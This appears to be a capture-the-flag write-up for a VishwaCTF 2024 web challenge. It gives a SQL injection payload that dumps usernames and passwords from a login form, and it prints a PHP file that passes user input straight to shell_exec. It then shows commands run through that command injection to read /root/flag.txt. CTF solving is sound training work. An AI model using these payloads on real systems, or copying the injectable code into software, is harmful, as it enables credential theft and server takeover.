1. SQLi on the login page:

![image](https://github.com/RJCyber1/VishwaCTF-2024-Writeups/assets/86359182/7bf3e602-0940-49f2-9514-769c2d97e0c5)

Payload (using burpsuite):

`username=test'UNION+SELEcT+username,null+from+users--+&password=test'UNION+SELEcT+pass,null+from+users--+`

![image](https://github.com/RJCyber1/VishwaCTF-2024-Writeups/assets/86359182/aaf70c7f-9c48-4a22-8748-d9ed4a298c22)

2. Login as pharmaowner: `pharmaowner:5trongp455$`

3. Buy `Needle and Syringe` to get pharmacy.php:

```
<?php
header('Content-Type: application/json');

if ($_SERVER["REQUEST_METHOD"] == "POST") 
{
    $enteredInput = $_POST['search_param'];
    
    if (strlen($enteredInput) == 0)
    {
        echo json_encode(['result' => "Search bar cannot be empty"]);
    }

    else
    {
        $result = shell_exec($enteredInput);

        if ($result == null)
        {
            echo json_encode(['result' => ($enteredInput . " not found in store")]);
        }

        else
        {
            echo json_encode(['result' => $result]);
        }
    }

} 

else 
{
    http_response_code(404);
    echo json_encode(['error' => 'Access Forbidden']);
}
?>
```

`shell_exec` means Command Injection can be used.

4. Find the flag file (`find / -name flag.txt`) and cat the flag (`cat /root/flag.txt`):

![image](https://github.com/RJCyber1/VishwaCTF-2024-Writeups/assets/86359182/2f73f71b-5364-4f04-abe5-de2715b7bd3e)
